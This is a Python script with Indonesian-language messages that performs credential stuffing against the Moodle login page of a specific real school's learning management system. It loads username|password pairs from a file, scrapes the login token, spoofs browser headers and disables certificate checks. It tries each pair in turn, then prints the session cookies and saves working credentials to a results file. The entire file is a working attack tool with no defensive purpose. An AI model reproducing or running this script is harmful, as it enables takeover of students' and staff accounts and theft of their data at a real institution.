import requests, random
import time
import re, os, json
from bs4 import BeautifulSoup
from rich import print as prints
from rich.panel import Panel
from rich.table import Table
from rich.tree import Tree
import urllib3
import certifi
from rich.console import Console as Console
from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
os.environ['REQUESTS_CA_BUNDLE'] = certifi.where()
console = Console()

# Global variables
session = requests.Session()
id_list = []
ok = 0
cp = 0
loop = 0

# Baca ID dan password dari file eksternal
def load_ids(file_path):
    try:
        with open(file_path, 'r') as f:
            lines = f.readlines()
            for line in lines:
                parts = line.strip().split('|')
                if len(parts) == 2:
                    id_list.append({'id': parts[0], 'password': parts[1]})
                else:
                    console.print(f"[red]Format tidak valid: {line.strip()}[/red]")
        console.print(f"[green]Berhasil memuat {len(id_list)} akun dari file {file_path}[/green]")
    except FileNotFoundError:
        console.print(f"[red]File {file_path} tidak ditemukan[/red]")
        exit()
        
        
def crack():
    global loop, ok, cp
    prog = Progress(
        SpinnerColumn('clock'),
        TextColumn('[progress.description]{task.description}'),
        BarColumn(),
        TextColumn('{task.percentage:.0f}%'),
        transient=True,
    )
    task_id = prog.add_task("Cracking...", total=len(id_list))

    with prog:
        for account in id_list:
            uid = account['id']
            pw = account['password']
            if attempt_login(uid, pw):
                prog.update(task_id, advance=1)
                break  # Stop the loop if login is successful
            else:
                prog.update(task_id, advance=1)
            loop += 1

            
            
def attempt_login(uid, password):
    global ok, cp
    try:
        response = session.get(f"https://lms.smkn4padalarang.sch.id/login/index.php", verify=False)
        logintoken_match = re.search('name="logintoken" value="(.*?)"', str(response.text))
        if not logintoken_match:
            prints(Panel.fit("[bold red]Gagal mendapatkan logintoken, silakan coba lagi!"))
            return
        logintoken = logintoken_match.group(1)

        data = {
            "logintoken": logintoken,
            "username": uid,
            "password": password
        }
        
        headers = {
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Host': 'lms.smkn4padalarang.sch.id',
            'Referer': 'https://lms.smkn4padalarang.sch.id/',
            'Sec-Ch-Ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Upgrade-Insecure-Requests': '1',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
        }
        
        login_response = session.post(
            "https://lms.smkn4padalarang.sch.id/login/index.php",
            data=data,
            headers=headers,
            allow_redirects=True,
            verify=False
        )
        if "Dashboard" in login_response.text:
            cookies = "; ".join([
                f"{key}={value}"
                for key, value in session.cookies.get_dict().items()
            ])
            session.cookies.update({key: value for key, value in (item.split('=') for item in cookies.split('; '))})
            url = "https://lms.smkn4padalarang.sch.id/my/"
            response = session.get(url, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            user_element = soup.find('span', class_='usertext')
            if user_element:
                user_name = user_element.text.strip()
            else:
                user_name = "Pengguna Tidak Diketahui"
            Meledak = Tree(Panel.fit(f"[bold green]{user_name} Login Berhasil"))
            Meledak.add(Panel.fit(f"[bold green]Username: {uid}, Password: {password}"))
            Meledak.add(Panel.fit(f"[bold green]Cookies tersimpan: {cookies}"))
            prints(Meledak)
            save_result("OK", uid, password)
            ok += 1
            return True
        else:
            return False
    except Exception as e:
        console.print(f"[red]Kesalahan: {e}[/red]")
        return False

def save_result(folder, uid, password):
    if not os.path.exists(folder):
        os.makedirs(folder)
    with open(f"{folder}/results.txt", 'a') as f:
        f.write(f"{uid}|{password}\n")
        
        
if __name__ == "__main__":
    os.system("clear")
    file_name = input("Masukkan nama file (contoh: akun.txt): ")
    load_ids(file_name)
    crack()
